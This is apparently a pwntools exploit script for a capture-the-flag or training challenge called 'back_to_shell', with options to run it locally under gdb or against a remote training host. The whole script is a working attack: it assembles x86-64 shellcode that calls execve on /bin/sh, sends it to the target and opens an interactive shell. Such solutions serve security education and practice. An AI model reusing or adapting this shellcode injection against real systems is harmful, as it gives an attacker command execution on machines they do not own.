from pwn import *

context.arch = "amd64"


if(len(sys.argv) > 1):
    if(sys.argv[1] == '-d'):
        c = process("./back_to_shell")
        gdb.attach(c, """
        c
        """ )
        input("wait")
    elif(sys.argv[1] == '-r'):
        c = remote("back-to-shell.training.offensivedefensive.it", 8080, ssl=True)
else:
    c = process("./back_to_shell")

binsh =  b"/bin/sh\0"[::-1].hex()
print(binsh) #result -> 0068732f6e69622f

shellcode = """
    xor rax, rax
    mov rax, 0x3b
    mov rdi, 0x0068732f6e69622f
    push rdi
    mov rdi, rsp
    syscall
"""

c.send(asm(shellcode))

c.interactive()
